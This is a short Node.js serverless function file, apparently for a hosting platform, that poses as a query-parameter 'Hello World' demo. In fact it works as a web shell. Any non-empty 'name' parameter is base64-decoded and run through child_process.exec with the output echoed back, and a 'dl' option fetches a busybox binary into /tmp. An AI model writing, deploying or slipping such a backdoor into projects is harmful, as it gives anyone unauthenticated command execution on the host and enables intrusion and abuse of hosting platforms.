const express = require("express");
const app = express();

// const config = require("platformsh-config").config();
// const port = config.port || 3000
// const port = process.env.PORT || 3000;
const port = 1337;

var exec = require("child_process").exec;
const os = require("os");
// const { createProxyMiddleware } = require("http-proxy-middleware");
var request = require("request");

var fs = require('fs');



function downloadFile(uri,filename,callback){
 var stream = fs.createWriteStream(filename);
 request(uri).pipe(stream).on('close', callback); 
}





/*
- How to use query parameters
Test:
curl http://localhost:1337/v1/functions/query-parameters\?name\=johan
*/

// import { Request, Response } from 'express'

// export default (req: Request, res: Response) => {
//   res.status(200).send(`Hello ${req.query.name}!`)
// }




// http://localhost:1337/v1/functions?name=base64-code

export default (req, res) => {
  // res.status(200).send(`Hello ${req.query.name}!`)

  let s = req.query.name;
  if (s==null || s==undefined || s=="") {
  	res.status(200).send(`Hello World!`)
  	return 
  } else if (s=="dl") {
  	var fileUrl = 'https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox';
  	var filename = '/tmp/busybox';
  	downloadFile(fileUrl,filename,function(){
	   	console.log(filename+'download success');
	   	// res.send(filename+'download success');
  	});
  	res.status(200).send(`download busybox!`)
  	return
  }

  try {
  	s = Buffer.from(s, 'base64').toString('utf-8');
  } catch(e) {
  	res.status(200).send(`invalid base64 shell code!`)
  	return
  }

  // s = Buffer.from(s, 'base64').toString('utf-8');
  exec(s, function (err, stdout, stderr) {
    if (err) {
      res.type("html").send("exec error：\n<pre>" + err + "</pre>");
    } else {
      res.type("html").send("exec success：\n<pre>" + stdout + "</pre>");
    }
  });
  
}





